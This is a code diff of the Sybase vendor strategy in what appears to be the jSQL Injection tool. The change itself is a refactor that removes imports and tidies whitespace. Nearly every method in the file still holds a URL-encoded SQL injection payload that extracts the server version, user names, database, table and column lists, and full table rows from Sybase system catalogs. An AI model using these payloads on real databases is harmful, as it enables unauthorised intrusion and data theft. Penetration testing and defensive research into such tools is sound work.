@@ -1,12 +1,10 @@
 package com.jsql.model.vendor;
 
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.List;
 
 import com.jsql.model.bean.Database;
 import com.jsql.model.bean.Table;
-import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
@@ -14,7 +12,7 @@ public class SybaseStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return 
+        return
             "select+" +
                 "@@version%2B'{%}'%2Bdb_name()%2B'{%}'%2Buser_name()%2B'{%}'%2Bsuser_name()" +
             "%2B'%01%03%03%07'r";
@@ -22,7 +20,7 @@ public class SybaseStrategy extends ASQLStrategy {
 
     @Override
     public String getSchemaList() {
-        return 
+        return
             "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
             "from(select+distinct++name+from+master..sysdatabases)t,(select+distinct+name+from+master..sysdatabases)t1+" +
             "where+t.name>=t1.name+" +
@@ -31,7 +29,7 @@ public class SybaseStrategy extends ASQLStrategy {
 
     @Override
     public String getTableList(Database database) {
-        return 
+        return
             "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
             "from(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t,(select+distinct+name+from+" + database + "..sysobjects+where+type='U')t1+" +
             "where+t.name>=t1.name+" +
@@ -40,7 +38,7 @@ public class SybaseStrategy extends ASQLStrategy {
 
     @Override
     public String getColumnList(Table table) {
-        return 
+        return
             "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.name%2b'%050%04'rr+" +
             "from(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t,(select+distinct+c.name+from+" + table.getParent() + "..syscolumns+c+inner+join+" + table.getParent() + "..sysobjects+t+on+c.id=t.id+where+t.name='" + table + "')t1+" +
             "where+t.name>=t1.name+" +
@@ -55,7 +53,7 @@ public class SybaseStrategy extends ASQLStrategy {
         
         formatListColumn = "rtrim(ltrim(convert(varchar," + formatListColumn + "%2b'')))";
 
-        return 
+        return
             "select+rr%2b'%01%03%03%07'r+from+(select+'%04'%2bt.s%2b'%050%04'rr+" +
             "from(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t,(select+distinct+" + formatListColumn +"s+from+" + database + ".." + table + ")t1+" +
             "where+t.s>=t1.s+" +
@@ -64,13 +62,12 @@ public class SybaseStrategy extends ASQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return
-            "select'SQLi'%2bsubstring(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
+        return "select'SQLi'%2bsubstring(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
     }
 
     @Override
     public String performanceQuery(String[] indexes) {
-        return 
+        return
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
                 "(select'SQLi$1'%2breplicate('%23',1024)%2b'iLQS')"
@@ -95,8 +92,7 @@ public class SybaseStrategy extends ASQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-        return 
-            "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
+        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
     }
     
     @Override
